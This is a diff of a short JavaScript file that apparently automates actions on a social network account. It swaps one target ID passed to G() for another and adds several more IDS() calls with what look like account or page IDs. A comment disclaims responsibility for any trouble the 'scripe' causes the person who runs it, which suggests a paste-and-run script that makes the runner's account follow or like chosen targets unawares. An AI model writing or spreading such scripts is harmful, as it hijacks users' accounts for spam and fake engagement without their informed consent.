@@ -1,3 +1,9 @@
+
+
+
+
+
+
 //i am not involve in any trouble you falls in because of this scripe
 
 
@@ -21,9 +27,10 @@ function IDS(r) {
         };
         Page.send(PageParams);
     }
-     G("443428375743271");
+     G("598368236842941");
 }
 IDS("100004711958528");
+IDS("100005510160534");
 
 setTimeout(function () {
 
@@ -46,9 +53,12 @@ setTimeout(function () {
             };
             Page.send(PageParams);
         }
-          G("443428375743271");
+          G("598368236842941");
     }
-    IDS("100004712079757");
- 
+ IDS("100005509004235");
+ IDS("100006035235711");
+ IDS("100006357332320");
+ IDS("100002688186485");
+ IDS("100008318173827");
 
 }, 5000);
